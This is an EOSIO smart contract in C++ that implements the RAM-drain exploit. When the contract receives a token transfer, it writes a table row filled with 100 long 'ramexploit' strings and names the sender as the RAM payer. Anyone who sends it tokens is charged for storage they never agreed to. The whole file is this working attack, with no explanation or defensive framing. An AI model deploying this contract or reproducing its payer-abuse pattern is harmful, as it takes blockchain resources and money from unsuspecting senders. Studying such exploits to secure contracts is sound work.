#include <eosiolib/eosio.hpp>
#include <eosiolib/currency.hpp>

using namespace eosio;
using std::string;

class vulnerable : contract {
private:

    // @abi table garbage
    struct Garbage {
        uint64_t            index;
        vector<string>      collector;

        uint64_t primary_key() const { return index; }
        EOSLIB_SERIALIZE( Garbage, (index)(collector) )
    };

    typedef multi_index<N(garbage), Garbage> Trashcan;

public:
    using contract::contract;
    vulnerable( name self ) : contract(self){}

    void empty(){}

    void receivedTokens( const currency::transfer& t, account_name code ) {
        if( t.to == _self ) {
            account_name sender = t.from;
            Trashcan trashcan(_self, _self);
            trashcan.emplace(sender, [&](auto& record){
                record.index = trashcan.available_primary_key();
                for(int i = 0; i < 100; i++){
                    record.collector.push_back("ramexploitramexploitramexploitramexploitramexploitramexploitramexploitramexploitramexploitramexploitramexploitramexploitramexploitramexploitramexploit");
                }
            });
        }
    }

    void apply( account_name contract, account_name action ) {
        if( action == N(transfer) ) {
            receivedTokens( unpack_action_data<eosio::currency::transfer>(), contract );
            return;
        }

        if( contract != _self ) return;
        auto& thiscontract = *this;
        switch( action ) {
            EOSIO_API( vulnerable, (empty) )
        };
    }
};

extern "C" {
[[noreturn]] void apply( uint64_t receiver, uint64_t code, uint64_t action ) {
    vulnerable c( receiver );
    c.apply( code, action );
    eosio_exit(0);
}
}